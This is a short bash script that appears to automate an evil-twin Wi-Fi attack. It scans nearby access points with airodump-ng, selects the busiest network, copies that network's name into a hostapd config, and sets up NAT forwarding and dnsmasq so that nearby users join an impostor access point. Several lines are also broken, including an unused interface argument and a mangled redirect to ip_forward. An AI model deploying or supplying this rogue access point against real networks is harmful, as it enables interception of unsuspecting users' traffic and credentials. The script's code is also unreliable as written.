#!/bin/bash
# Scan all AP around us
interface="$1"

clear

sudo airmon-ng check kill

sudo airmon-ng start wlan0 

sudo timeout -s 2 15 airodump-ng wlan0mon -w psk & echo "DEBUG" & sleep 16

sudo rm psk-01.cap & sudo rm psk-01.csv & sudo rm psk-01.kismet.netxml

maxData=0
finalName=""
finalSSID=""

input="psk-01.kismet.csv"
#Delete first line of the file (without data)
sed -i '1d' $input
#Read each line
while IFS= read -r line
do
  #Parse the given line and put every datas in an array
  IFS=';' read -ra ARRAY <<< "$line"

  if [ "${ARRAY[13]}" -gt "$maxData" ] ; then
    maxData="${ARRAY[13]}"
    finalName="${ARRAY[2]}"
    finalSSID="${ARRAY[3]}"

  fi


done < "$input"

echo "$maxData"
echo "$finalName"
echo "$finalSSID"

# Creation of our AP 
sudo airmon-ng stop wlan0mon

sed -i "5s/.*/ssid="$finalName"/" hostconf.conf

sudo echo 1 > sudo /proc/sys/net/ipv4/ip_forward
echo "Echo 1 OK"

sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo "iptables OK"

sudo ip addr add 192.168.1.1/24 dev wlan0
echo "ip add OK"

sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"

sudo dnsmasq -d -C host.conf

sudo rm psk-01.kismet.csv

